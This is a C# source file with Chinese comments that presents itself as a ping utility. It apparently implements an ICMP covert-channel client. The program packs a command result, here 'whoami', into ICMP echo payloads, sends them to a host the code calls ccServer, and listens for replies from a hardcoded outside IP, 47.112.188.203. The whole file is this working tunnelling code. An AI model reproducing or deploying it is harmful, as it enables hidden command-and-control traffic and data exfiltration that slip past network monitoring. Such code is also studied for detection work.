using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;


namespace PingC
{
    public class ping
    {
        const int SOCKET_ERROR = -1;
        const int ICMP_ECHO = 8;


        //public string Recvicmp()
        //{ 
        
        //}

        public static void Main(string[] args)
        {
            ping p = new ping();
            Console.WriteLine("请输入要 Ping 的IP或者主机名字：");
            string MyUrl = Console.ReadLine();
            //string MyUrl = "47.112.188.203";
            string commandresult = "whoami";
            //Console.WriteLine("正在 Ping " + MyUrl + " ……");
            int random_key = 1111;
            Console.Write(p.PingHost(MyUrl, commandresult, random_key));
            string result = p.ListenHost("47.112.188.203");

        }

        public static void Sendicmp(string ccServer, string commandresult, int random_key)
        {
            ping p = new ping();
            //string commandresult = "whoami";
            //string ccServer = "47.112.188.203";
            string result = p.PingHost(ccServer, commandresult, random_key);
        }
        
        public string ListenHost(string host)
        {
            // 声明 IPHostEntry 
            IPHostEntry fromHE;
            IPAddress ServerHE;
            int nBytes = 0;

            //初始化ICMP的Socket 
            Socket socket =
             new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
            socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.SendTimeout, 1000);

            host = "47.112.188.203";

            ServerHE = Dns.GetHostAddresses(host)[0];

            // 把 Server IP_EndPoint转换成EndPoint 
            //IPEndPoint ipepServer = new IPEndPoint(ServerHE.AddressList[0], 0);
            IPEndPoint ipepServer = new IPEndPoint(ServerHE, 0);
            EndPoint epServer = (ipepServer);

            // 设定客户机的接收Endpoint 
            fromHE = Dns.GetHostEntry(Dns.GetHostName());
            IPEndPoint ipEndPointFrom = new IPEndPoint(fromHE.AddressList[0], 0);
            EndPoint EndPointFrom = (ipEndPointFrom);

            socket.Bind(ipEndPointFrom);

            Byte[] ReceiveBuffer = new Byte[4096];
            nBytes = 0;

            bool recd = false;

            //loop for checking the time of the server responding 
            while (!recd)
            {
                nBytes = socket.ReceiveFrom(ReceiveBuffer, 256, 0, ref EndPointFrom);
                if (nBytes == SOCKET_ERROR)
                {
                    return "主机没有响应";

                }
                else if (nBytes > 0)
                {

                    string Receivestring = System.Text.Encoding.Default.GetString(ReceiveBuffer);
                    Receivestring = Receivestring.Remove(0, 28);
                    Console.WriteLine(Receivestring);
                    return Receivestring;

                }

            }
            socket.Close();
            return "false";
        }


        public string PingHost(string host, string commandresult, int random_key)
        {
            // 声明 IPHostEntry 
            IPHostEntry fromHE;
            IPAddress ServerHE;
            int nBytes = 0;
            int dwStart = 0, dwStop = 0;

            //初始化ICMP的Socket 
            Socket socket =
             new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
            socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.SendTimeout, 1000);
            // 得到Server EndPoint 

            //try
            //{
            //    ServerHE = Dns.GetHostEntry(host);
            //}
            //catch (Exception)
            //{

            //    return "没有发现主机";
            //}


            ServerHE = Dns.GetHostAddresses(host)[0];

            // 把 Server IP_EndPoint转换成EndPoint 
            //IPEndPoint ipepServer = new IPEndPoint(ServerHE.AddressList[0], 0);
            IPEndPoint ipepServer = new IPEndPoint(ServerHE, 0);
            EndPoint epServer = (ipepServer);

            // 设定客户机的接收Endpoint 
            fromHE = Dns.GetHostEntry(Dns.GetHostName());
            IPEndPoint ipEndPointFrom = new IPEndPoint(fromHE.AddressList[0], 0);
            EndPoint EndPointFrom = (ipEndPointFrom);

            int PacketSize = 0;
            IcmpPacket packet = new IcmpPacket();


            // 构建要发送的包 
            //packet.Type = ICMP_ECHO; //8 
            packet.Type = 8; //8 
            packet.SubCode = 0;
            packet.CheckSum = 0;
            packet.Identifier = 77;
            packet.SequenceNumber = (ushort)random_key;
            int PingData = commandresult.Length; // sizeof(IcmpPacket) - 8; 
            packet.Data = new Byte[PingData];

            // 初始化Packet.Data 
            for (int i = 0; i < PingData; i++)
            {
                packet.Data[i] = (byte)commandresult[i];
            }

            //Variable to hold the total Packet size 
            PacketSize = PingData + 8;
            Byte[] icmp_pkt_buffer = new Byte[PacketSize];
            Int32 Index = 0;
            //again check the packet size 
            Index = Serialize(
             packet,
             icmp_pkt_buffer,
             PacketSize,
             PingData);
            //if there is a error report it 
            if (Index == -1)
            {
                return "Error Creating Packet";

            }
            // convert into a UInt16 array 

            //Get the Half size of the Packet 
            Double double_length = Convert.ToDouble(Index);
            Double dtemp = Math.Ceiling(double_length / 2);
            int cksum_buffer_length = Index / 2;
            //Create a Byte Array 
            UInt16[] cksum_buffer = new UInt16[cksum_buffer_length];
            //Code to initialize the Uint16 array 
            int icmp_header_buffer_index = 0;
            for (int i = 0; i < cksum_buffer_length; i++)
            {
                cksum_buffer[i] =
                 BitConverter.ToUInt16(icmp_pkt_buffer, icmp_header_buffer_index);
                icmp_header_buffer_index += 2;
            }
            //Call a method which will return a checksum 
            UInt16 u_cksum = checksum(cksum_buffer, cksum_buffer_length);
            //Save the checksum to the Packet 
            packet.CheckSum = u_cksum;

            // Now that we have the checksum, serialize the packet again 
            Byte[] sendbuf = new Byte[PacketSize];
            //again check the packet size 
            Index = Serialize(
             packet,
             sendbuf,
             PacketSize,
             PingData);
            //if there is a error report it 
            if (Index == -1)
            {
                return "Error Creating Packet";

            }


            dwStart = System.Environment.TickCount; // Start timing 
            //send the Packet over the socket 
            if ((nBytes = socket.SendTo(sendbuf, PacketSize, 0, epServer)) == SOCKET_ERROR)
            {
                return "Socket Error: cannot send Packet";
            }
            // Initialize the buffers. The receive buffer is the size of the 
            // ICMP header plus the IP header (20 bytes) 
            Byte[] ReceiveBuffer = new Byte[4096];
            nBytes = 0;
            //Receive the bytes 
            bool recd = false;
            int timeout = 0;

            //loop for checking the time of the server responding 
            while (!recd)
            {
                nBytes = socket.ReceiveFrom(ReceiveBuffer, 256, 0, ref EndPointFrom);
                if (nBytes == SOCKET_ERROR)
                {
                    return "主机没有响应";

                }
                else if (nBytes > 0)
                {
                    dwStop = System.Environment.TickCount - dwStart; // stop timing 

                    string Receivestring = System.Text.Encoding.Default.GetString(ReceiveBuffer);
                    Receivestring = Receivestring.Remove(0, 23);

                    return Receivestring;

                }
                timeout = System.Environment.TickCount - dwStart;
                if (timeout > 1000)
                {
                    return "超时";
                }
            }

            //close the socket 
            socket.Close();
            return "close";
        }



        /// <summary> 
        ///  This method get the Packet and calculates the total size 
        ///  of the Pack by converting it to byte array 
        /// </summary> 
        public static Int32 Serialize(IcmpPacket packet, Byte[] Buffer,
         Int32 PacketSize, Int32 PingData)
        {
            Int32 cbReturn = 0;
            // serialize the struct into the array 
            int Index = 0;

            Byte[] b_type = new Byte[1];
            b_type[0] = (packet.Type);

            Byte[] b_code = new Byte[1];
            b_code[0] = (packet.SubCode);

            Byte[] b_cksum = BitConverter.GetBytes(packet.CheckSum);
            Byte[] b_id = BitConverter.GetBytes(packet.Identifier);
            Byte[] b_seq = BitConverter.GetBytes(packet.SequenceNumber);

            Array.Copy(b_type, 0, Buffer, Index, b_type.Length);
            Index += b_type.Length;

            Array.Copy(b_code, 0, Buffer, Index, b_code.Length);
            Index += b_code.Length;

            Array.Copy(b_cksum, 0, Buffer, Index, b_cksum.Length);
            Index += b_cksum.Length;

            Array.Copy(b_id, 0, Buffer, Index, b_id.Length);
            Index += b_id.Length;

            Array.Copy(b_seq, 0, Buffer, Index, b_seq.Length);
            Index += b_seq.Length;

            // copy the data 
            Array.Copy(packet.Data, 0, Buffer, Index, PingData);
            Index += PingData;
            if (Index != PacketSize/* sizeof(IcmpPacket)  */)
            {
                cbReturn = -1;
                return cbReturn;
            }

            cbReturn = Index;
            return cbReturn;
        }
        /// <summary> 
        ///  This Method has the algorithm to make a checksum 
        /// </summary> 
        public static UInt16 checksum(UInt16[] buffer, int size)
        {
            Int32 cksum = 0;
            int counter;
            counter = 0;

            while (size > 0)
            {
                UInt16 val = buffer[counter];

                cksum += buffer[counter];
                counter += 1;
                size -= 1;
            }

            cksum = (cksum >> 16) + (cksum & 0xffff);
            cksum += (cksum >> 16);
            return (UInt16)(~cksum);
        }
    }
    /// 类结束 
    /// <summary> 
    ///  Class that holds the Pack information 
    /// </summary> 
    public class IcmpPacket
    {
        public Byte Type;    // type of message 
        public Byte SubCode;    // type of sub code 
        public UInt16 CheckSum;   // ones complement checksum of struct 
        public UInt16 Identifier;      // identifier 
        public UInt16 SequenceNumber;     // sequence number 
        public Byte[] Data;

    } // class IcmpPacket 

}